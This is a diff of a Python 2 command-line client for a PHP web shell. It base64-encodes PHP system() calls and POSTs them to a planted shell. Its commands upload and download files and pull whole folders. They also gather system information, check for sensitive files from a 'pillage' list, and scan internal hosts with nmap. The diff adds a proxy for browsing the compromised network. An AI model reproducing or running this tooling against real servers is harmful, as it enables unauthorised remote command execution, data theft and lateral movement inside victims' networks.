@@ -1,10 +1,11 @@
 
 import base64
-import httplib
-from urlparse import urlparse
 from cmd import Cmd
 import os
 import re
+import request
+from hashlib import sha512
+import proxy
 
 
 def extract_ip_mask_ifconfig(addr_line):
@@ -50,6 +51,7 @@ class rshell(Cmd):
     ips = {}
     hosts = {}
     width = 80
+    proxy_object = None
 
     def __init__(self, shell_url, proxy):
         Cmd.__init__(self)
@@ -62,25 +64,32 @@ class rshell(Cmd):
         f.close()
 
     def do_help(self, line):
-        print "help: Show this message"
-        print "payload: show the shell code in php"
-        print "download: download remotepath/remotefile localpath/localfile"
-        print "upload: upload localpath/localfile remotepath/remotefile"
-        print "compress_folder: compress_folder folder_path file.tar.gz"
-        print "dwfolder: do_dwfolder folder_path"
-        print "getsysinfo: get info about the system"
-        print "getswversion: get versions of some software"
-        print "check_files: check existence of a list of files (pillage.lst)"
-        print "get_local_ips: get local ips and subnet mask bits"
-        print "print_local_ips: print local ips finded"
-        print "find_hosts: find hosts in local network using nmap"
-        print "print_hosts [ip]: print finded hosts info"
-        print "Or write a command to send to the server shell"
+        print " " * 15, "help: Show this message\n"
+        print " " * 15, "payload: show the shell code in php\n"
+        print " " * 15, "download: download remotepath/remotefile localpath/localfile\n"
+        print " " * 15, "upload: upload localpath/localfile remotepath/remotefile\n"
+        print " " * 15, "compress_folder: compress_folder folder_path file.tar.gz\n"
+        print " " * 15, "dwfolder: do_dwfolder folder_path\n"
+        print " " * 15, "getsysinfo: get info about the system\n"
+        print " " * 15, "getswversion: get versions of some software\n"
+        print " " * 15, "check_files: check existence of a list of files (pillage.lst)\n"
+        print " " * 15, "get_local_ips: get local ips and subnet mask bits\n"
+        print " " * 15, "print_local_ips: print local ips finded\n"
+        print " " * 15, "find_hosts: find hosts in local network using nmap\n"
+        print " " * 15, "print_hosts [ip]: print finded hosts info\n"
+        print " " * 15, "start_proxy: starts a proxy on localhost:8888, set that in your browser and surf the internal network\n"
+        print " " * 15, "stop_proxy: stops the proxy server\n"
+        print " " * 15, "Or write a command to send to the server shell\n"
+
         return None
 
     def default(self, line):
-        #This is the default command method
-        #system function is called with the command to execute
+        """
+        This is the default command method
+        php system function is called with
+        the command to execute
+        :param line: php command to execute using system function
+        """
         cmd = "system('{0}');".format(line)
         #doing the request to the server
         (code, response) = self.dorequest(cmd)
@@ -88,51 +97,53 @@ class rshell(Cmd):
             print response
 
     def emptyline(self):
-        print "Deja de darle al enter"
+        print "type help or ? to get help"
 
     def do_quit(self, line):
-        #Return true to exit in postcmd
+        """
+        Return true to exit in postcmd
+
+        :param line:
+        :return: Boolean
+        """
+        self.do_stop_proxy(line)
         return True
 
     def postcmd(self, stop, line):
-        #This stop cmdloop if returns true
-        #check if stop value is true
-        #stop is the return value of do_* methods
-        if stop:
-            return True
+        """
+        This stop cmdloop if returns true
+        check if stop value is true
+        stop is the return value of do_* methods
+        :param stop: Boolean
+        :param line:
+        :return: stop
+        """
+        return stop
 
     def do_exit(self, line):
-        #Return true to exit in postcmd
+        """
+        Return true to exit in postcmd
+
+        :param line:
+        :return: Boolean
+        """
+        self.do_stop_proxy(line)
         return True
 
-    def dorequest(self, phpcmd):
+    def dorequest(self, php_cmd):
         #Post request using the param parameter
-        cmd_base64 = base64.encodestring(phpcmd)[:-1]
-        fullurl = self.shell_url
-        parsed_url = urlparse(fullurl)
-        url = ''
-        con = None
+        """
+        Make a request to the server sending the php code
+        :param php_cmd: php code to execute on the server
+        :return: tuple, the http code and the html result of the request
+        """
+        cmd_base64 = base64.encodestring(php_cmd)[:-1]
+        full_url = self.shell_url
+        #parsed_url = urlparse(full_url)
+        #url = ''
+        #con = None
         params = "param={0}".format(cmd_base64)
-        if self.proxy:
-            (ip, port) = self.proxy.split(':')
-            con = httplib.HTTPConnection(ip, int(port))
-            url = fullurl
-        else:
-            url = parsed_url.path
-            con = httplib.HTTPConnection(parsed_url.netloc, parsed_url.port)
-        headers = {"Content-type": "application/x-www-form-urlencoded",
-                   "Accept": "text/plain"}
-        if con:
-            con.request('POST', url, params, headers)
-            response = con.getresponse()
-            if response.status == 200:
-                return (response.status, response.read())
-            else:
-                #
-                return (response.status, None)
-        else:
-            #
-            return (None, None)
+        return 200, request.do_request(full_url, params, self.proxy)
 
     def do_shell(self, line):
         #This method execute the command locally
@@ -155,7 +166,7 @@ class rshell(Cmd):
             f.write(data)
             f.close()
             resp = raw_input("Open in default browser? (y/n): ")
-            if (resp == "y"):
+            if resp == "y":
                 import webbrowser
                 webbrowser.open(phpinfofilename)
         else:
@@ -182,14 +193,14 @@ class rshell(Cmd):
     def do_upload(self, line):
         (filename, destination) = line.split()
         f = file(filename)
-        fname = os.path.basename(filename)
+        f_name = os.path.basename(filename)
         #Encode file data in base 64
         data = base64.encodestring(f.read()).replace("\n", "")
         f.close()
         #Building the command in remote server to decode base 64
         # and write the data in the file
         cmd = "file_put_contents('{0}/{1}',base64_decode('{2}'));"
-        (code, data) = self.dorequest(cmd.format(destination, fname, data))
+        (code, data) = self.dorequest(cmd.format(destination, f_name, data))
         if code == 200:
             print data
         else:
@@ -255,11 +266,14 @@ class rshell(Cmd):
             print "Error"
 
     def do_check_files(self, line):
-        filelist = file("pillage.lst")
-        for filename in filelist:
+        """
+            pillage.lst from pwnwiki (https://github.com/pwnwiki)
+        """
+        file_list = file("pillage.lst")
+        for filename in file_list:
             #Check filename, [:-1] to remove eol from readline
             self.file_exists(filename[:-1])
-        filelist.close()
+        file_list.close()
         return None
 
     def do_get_local_ips(self, line):
@@ -325,6 +339,23 @@ class rshell(Cmd):
                 print "Host name: {0}".format(info[0])
                 for port in info[1]:
                     print port
+
+    def do_start_proxy(self, line):
+        """Start a proxy server on the port
+        """
+        self.proxy_object = proxy.Proxy()
+        self.proxy_object.set_shell_url(self.shell_url)
+        self.proxy_object.start()
+        return None
+
+    def do_stop_proxy(self, line):
+        if self.proxy_object:
+            self.proxy_object.terminate()
+            self.proxy_object.join()
+
+    def do_set_password(self, line):
+        a = sha512(line)
+        print a.hexdigest()
 
 #    def do_cd(self, line):
 #        cmd = "cd ../; pwd"
